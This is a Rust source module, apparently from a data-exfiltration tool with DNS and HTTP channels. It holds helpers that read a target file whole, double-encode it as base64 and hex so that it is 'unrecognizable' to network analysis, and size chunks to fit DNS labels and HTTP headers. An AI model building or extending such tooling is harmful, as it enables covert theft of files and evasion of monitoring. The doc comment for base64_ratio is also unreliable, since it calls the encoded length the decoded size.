pub mod dns;
pub mod http;

use std::{io::Read, path::PathBuf};

use base64::Engine;

/// Calculates the size of a chunk when decoded from base64 (without padding).
///
/// This function computes how many raw bytes will result from decoding a base64-encoded
/// payload of the given length. Used in capacity planning for chunked exfiltration
/// to ensure encoded data fits within protocol constraints (DNS labels, HTTP headers, etc).
///
/// Formula: ((4 * payload_length + 2) / 3) floored
///
/// # Arguments
/// * `payload_length` - The length of the base64-encoded payload (with NO_PAD mode).
///
/// # Returns
/// The approximate size in bytes of the decoded (raw) chunk.
pub fn base64_ratio(payload_length: usize) -> usize {
    (((4.0 * payload_length as f32) + 2.0) / 3.0).floor() as usize
}

/// Double-encodes a string using base64 then hex encoding.
///
/// This function applies two layers of encoding to prepare data for transmission:
/// 1. Base64 encoding (without padding) converts binary data to ASCII-safe text
/// 2. Hex encoding converts the base64 output to hexadecimal representation
///
/// This dual-encoding approach ensures maximum compatibility across multiple exfiltration
/// channels while making the data unrecognizable at first glance during network analysis.
/// The NO_PAD mode for base64 removes padding characters, reducing transmission size.
///
/// # Arguments
/// * `string` - The input string to be encoded (typically a serialized Node).
///
/// # Returns
/// A hexadecimal-encoded string representing the base64-encoded input.
pub fn encode_b64_hex(string: String) -> String {
    let b64_engine = base64::engine::GeneralPurpose::new(
        &base64::alphabet::STANDARD,
        base64::engine::general_purpose::NO_PAD,
    );

    hex::encode(b64_engine.encode(string.as_bytes()))
}

/// Reads an entire file into memory as raw bytes.
///
/// Loads the complete file content into a byte vector using buffered I/O. This function
/// reads the entire file at once, making it suitable for files that fit comfortably in
/// memory. Useful for preparing target data before chunking and encoding for exfiltration.
///
/// # Arguments
/// * `filepath` - Path to the file to be exfiltrated.
///
/// # Returns
/// A vector of bytes containing the complete unmodified file contents.
///
/// # Errors
/// Returns an error if the file cannot be opened or read.
pub fn buffered_read_file(filepath: &PathBuf) -> super::error::Result<Vec<u8>> {
    let mut opened_file = std::fs::File::open(filepath)?;
    let mut file_buffer: Vec<u8> = Vec::new();
    opened_file.read_to_end(&mut file_buffer)?;

    Ok(file_buffer)
}

/// Calculates the size of raw data from its base64-encoded size.
///
/// Reverse-calculates the number of bytes that would result from decoding a base64-encoded
/// payload. This is used to plan chunk sizes when the encoded size is constrained by protocol
/// limitations (e.g., DNS labels, HTTP headers). The calculation accounts for base64's 4:3
/// expansion ratio.
///
/// Formula: (payload_length * 3) / 4 floored
///
/// # Arguments
/// * `payload_length` - The length in bytes of the base64-encoded payload.
///
/// # Returns
/// The approximate size in bytes of the raw decoded data.
pub fn decoded_chunk_size(payload_length: usize) -> usize {
    ((payload_length as f32 * 3.0) / 4.0).floor() as usize
}
